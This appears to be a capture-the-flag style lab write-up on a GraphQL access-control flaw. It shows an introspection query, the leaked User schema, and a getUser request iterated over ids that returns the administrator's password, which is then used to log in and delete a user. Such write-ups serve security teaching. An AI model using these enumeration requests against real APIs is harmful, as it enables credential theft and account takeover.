# Accidental exposure of private GraphQL fields

The user management functions for this lab are powered by a GraphQL endpoint. The lab contains an access control vulnerability whereby you can induce the API to reveal user credential fields.

To solve the lab, sign in as the administrator and delete the username `carlos`.

---

## 1. Detection

- Had BurpSuite turned on, scoped to the lab domain, and listening in the background for HTTPS traffic.
- Accessed the lab, went to the home page, and clicked on one of the posts, navigating to `/post?postId=3`.
- Found multiple requests captured in BurpSuite's HTTP history.
- Sent an introspection query to `/graphql/v1` to check whether introspection was enabled and map out the schema:

```http
POST /graphql/v1 HTTP/2
Host: 0a1f006204aefe2983ea511100cc001d.web-security-academy.net
Cookie: session=b2z4r5CO90DKBpOrh57kdvOC3am8Jd5I
Content-Length: 746
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: application/json
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Content-Type: application/json
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
Origin: https://0a1f006204aefe2983ea511100cc001d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1f006204aefe2983ea511100cc001d.web-security-academy.net/
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"query": "query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}
```

- Introspection was enabled. Going through the leaked schema, found a `getUser` query under the `query` root type:

```json
{
  "name": "getUser",
  "description": null,
  "args": [
    {
      "name": "id",
      "description": null,
      "type": {
        "kind": "NON_NULL",
        "name": null,
        "ofType": {
          "kind": "SCALAR",
          "name": "Int",
          "ofType": null
        }
      },
      "defaultValue": null
    }
  ],
  "type": {
    "kind": "OBJECT",
    "name": "User",
    "ofType": null
  },
  "isDeprecated": false,
  "deprecationReason": null
}
```

- And the corresponding `User` object type it returns:

```json
{
  "kind": "OBJECT",
  "name": "User",
  "description": null,
  "fields": [
    {
      "name": "id",
      "type": { "ofType": { "kind": "SCALAR", "name": "Int" } }
    },
    {
      "name": "username",
      "type": { "ofType": { "kind": "SCALAR", "name": "String" } }
    },
    {
      "name": "password",
      "type": { "ofType": { "kind": "SCALAR", "name": "String" } }
    }
  ],
  "inputFields": null,
  "interfaces": [],
  "enumValues": null,
  "possibleTypes": null
}
```

- The `User` type exposes a `password` field directly alongside `id` and `username` — even though no part of the application's UI would normally request or display a password. This was the standout finding: a credential field reachable through a query that isn't gated behind any visible authorization check.

---

## 2. Exploiting the Exposed Field

- Crafted a `getUser` query in Repeater that explicitly requests both `username` and `password`:

```http
POST /graphql/v1 HTTP/2
Host: 0a1f006204aefe2983ea511100cc001d.web-security-academy.net
Cookie: session=b2z4r5CO90DKBpOrh57kdvOC3am8Jd5I
Content-Length: 185
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36
Accept: application/json
Sec-Ch-Ua: "Google Chrome";v="149", "Chromium";v="149", "Not)A;Brand";v="24"
Content-Type: application/json
Dnt: 1
Sec-Ch-Ua-Mobile: ?0
Origin: https://0a1f006204aefe2983ea511100cc001d.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a1f006204aefe2983ea511100cc001d.web-security-academy.net/post?postId=3
Accept-Encoding: gzip, deflate, br
Accept-Language: en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7
Priority: u=1, i

{"query":"\n    query getUser($id: Int!) {\n        getUser(id: $id) {\n            username\n            password\n            }\n    }","operationName":"getUser","variables":{"id":$$}}
```

- Iterated the `id` variable starting from `1`, sending the request repeatedly with incrementing values.

> **Why this works:** The `getUser` query and the underlying `User` type don't enforce any role-based restriction on who can request the `password` field. Since GraphQL lets a client choose exactly which fields to return, requesting `password` alongside `username` for an arbitrary user `id` simply returns it — the access control gap is in the schema/resolver, not in any single endpoint URL.

---

## 3. Solve the Challenge

- At one of the tested IDs, got back:

```http
HTTP/2 200 OK
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 118

{
  "data": {
    "getUser": {
      "username": "administrator",
      "password": "1c50pv1zj30b0cs79o6y"
    }
  }
}
```

- This leaked the administrator's credentials directly: `administrator:1c50pv1zj30b0cs79o6y`.
- Logged into `/login` using these credentials, accessed `/admin`, and deleted the user `carlos`.
- Lab solved.